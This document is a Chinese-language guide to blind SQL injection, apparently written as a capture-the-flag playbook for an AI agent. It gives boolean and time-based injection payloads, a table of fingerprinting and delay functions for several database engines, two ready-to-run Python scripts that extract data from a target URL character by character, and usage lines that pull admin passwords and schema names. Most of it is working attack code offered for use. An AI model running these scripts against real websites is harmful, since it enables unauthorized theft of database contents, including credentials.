# 盲注深度指南

## 布尔盲注数据提取（无回显时）

**当 UNION 和报错注入都不可用时，用布尔盲注逐字符提取：**
```sql
-- 判断 flag 第1个字符的 ASCII 码
' AND ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>70-- → 响应正常 → > 70
' AND ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>80-- → 响应异常 → <= 80
-- 二分法缩小范围直到确定字符

-- 先确定 flag 长度
' AND LENGTH((SELECT flag FROM flag))>50--
' AND LENGTH((SELECT flag FROM flag))>60--
```

## 时间盲注（布尔盲注也无差异时）

```sql
' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>70,SLEEP(3),0)--
```
响应延迟 3 秒 → 条件为真。

## 数据库类型识别

| 数据库 | 版本查询 | 延时函数 | 注释符 |
|--------|----------|----------|--------|
| MySQL | `SELECT @@version` | `SLEEP()` | `#` `-- ` |
| MSSQL | `SELECT @@version` | `WAITFOR DELAY` | `--` |
| Oracle | `SELECT banner FROM v$version` | `dbms_pipe.receive_message` | `--` |
| PostgreSQL | `SELECT version()` | `pg_sleep()` | `--` |
| SQLite | `SELECT sqlite_version()` | 无原生延时 | `--` |

---

## ⛔ 自动化盲注脚本（agent 必须用脚本，禁止手动二分法）

### 布尔盲注自动化脚本

```python
#!/usr/bin/env python3
"""布尔盲注自动提取数据 - 二分法"""
import requests
import sys

# ===== 配置区域（根据实际情况修改）=====
URL = "http://target/page.php"
METHOD = "GET"  # GET 或 POST
PARAM = "id"    # 注入参数名
TRUE_MARKER = "Welcome"  # 条件为真时响应中包含的特征字符串
# 注入模板：{condition} 会被替换为判断条件
# GET: 直接拼在参数值后面
# 根据闭合方式调整引号和注释
INJECT_TEMPLATE = "1' AND {condition}-- "
# 要提取的 SQL 子查询
EXTRACT_QUERY = "(SELECT flag FROM flag LIMIT 0,1)"
# ===== 配置结束 =====

def check(condition):
    """发送请求，判断条件是否为真"""
    payload = INJECT_TEMPLATE.format(condition=condition)
    if METHOD == "GET":
        r = requests.get(URL, params={PARAM: payload}, timeout=10)
    else:
        r = requests.post(URL, data={PARAM: payload}, timeout=10)
    return TRUE_MARKER in r.text

def get_length(query):
    """二分法获取数据长度"""
    low, high = 0, 200
    while low < high:
        mid = (low + high) // 2
        if check(f"LENGTH({query})>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(query, pos):
    """二分法获取指定位置的字符"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING({query},{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract(query):
    """提取完整数据"""
    length = get_length(query)
    print(f"[*] Data length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        result += c
        print(f"[*] Progress: {result}", flush=True)
    return result

if __name__ == "__main__":
    query = sys.argv[1] if len(sys.argv) > 1 else EXTRACT_QUERY
    print(f"[*] Extracting: {query}")
    data = extract(query)
    print(f"\n[+] RESULT: {data}")
```

### 时间盲注自动化脚本

```python
#!/usr/bin/env python3
"""时间盲注自动提取数据 - 通过响应延时判断"""
import requests
import sys
import time

# ===== 配置区域 =====
URL = "http://target/page.php"
METHOD = "GET"
PARAM = "id"
DELAY = 3  # 延时秒数（条件为真时延时）
THRESHOLD = DELAY - 0.5  # 判断阈值
# MySQL: IF(condition,SLEEP(N),0)
# MSSQL: IF condition WAITFOR DELAY '0:0:N'
# PostgreSQL: CASE WHEN condition THEN pg_sleep(N) END
INJECT_TEMPLATE = "1' AND IF({condition},SLEEP(" + str(DELAY) + "),0)-- "
EXTRACT_QUERY = "(SELECT flag FROM flag LIMIT 0,1)"
# ===== 配置结束 =====

def check(condition):
    """通过响应时间判断条件真假"""
    payload = INJECT_TEMPLATE.format(condition=condition)
    start = time.time()
    try:
        if METHOD == "GET":
            requests.get(URL, params={PARAM: payload}, timeout=DELAY + 5)
        else:
            requests.post(URL, data={PARAM: payload}, timeout=DELAY + 5)
    except requests.Timeout:
        return True  # 超时也视为延时成功
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_length(query):
    low, high = 0, 200
    while low < high:
        mid = (low + high) // 2
        if check(f"LENGTH({query})>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(query, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING({query},{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract(query):
    length = get_length(query)
    print(f"[*] Data length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        result += c
        print(f"[*] Progress: {result}", flush=True)
    return result

if __name__ == "__main__":
    query = sys.argv[1] if len(sys.argv) > 1 else EXTRACT_QUERY
    print(f"[*] Extracting (time-based): {query}")
    data = extract(query)
    print(f"\n[+] RESULT: {data}")
```

### 使用方法

```bash
# 1. 修改脚本顶部配置区域（URL/PARAM/注入模板/特征字符串）
# 2. 运行

# 布尔盲注
python3 bool_blind.py "(SELECT flag FROM flag LIMIT 0,1)"

# 时间盲注
python3 time_blind.py "(SELECT password FROM users WHERE username='admin')"

# 先提取数据库名
python3 bool_blind.py "database()"

# 提取表名
python3 bool_blind.py "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"

# 提取列名
python3 bool_blind.py "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag')"
```

### 适配不同数据库

| 数据库 | 时间盲注模板 |
|--------|-------------|
| MySQL | `IF({condition},SLEEP(3),0)` |
| MSSQL | `IF {condition} WAITFOR DELAY '0:0:3'` |
| PostgreSQL | `CASE WHEN {condition} THEN pg_sleep(3) END` |
| Oracle | `CASE WHEN {condition} THEN dbms_pipe.receive_message('a',3) END` |
| SQLite | `CASE WHEN {condition} THEN randomblob(100000000) END` |
